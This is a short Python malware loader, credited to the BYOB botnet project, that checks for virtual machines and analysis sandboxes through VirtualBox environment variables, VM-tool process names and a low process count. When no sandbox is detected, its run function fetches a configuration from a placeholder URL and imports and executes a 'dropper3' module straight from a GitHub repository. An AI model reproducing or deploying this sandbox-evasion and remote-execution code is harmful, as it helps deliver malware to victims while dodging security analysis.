####################################################
####################################################
#### DISCLAMERL: FULL CREDITS TO                ####
#### MALWAREDLLC/BYOB FOR THIS SANDBOX CHECK!!! ####
####################################################
####################################################

import os
def environment():
    environment = [key for key in os.environ if 'VBOX' in key and not key in ["VBOX_MSI_INSTALL_PATH"]] #whitlist virtualbox installed in user (only positive if in sandbox enviroment) 
    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
    import os

    # Running the aforementioned command and saving its output
    output = os.popen('wmic process get description, processid').read()

    # Displaying the output
    lst = output.split("\n")
    while "" in lst:
        lst.remove("")
    if len(lst) < 30: return False

    return bool(environment + processes)

def run():
    if not environment():
        import httpimport, requests, json
        config_url = "CONFIG_URL"
        config_text = requests.get(config_url).text
        config = json.loads(config_text)
        with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"]):
            import dropper3
            dropper3.run()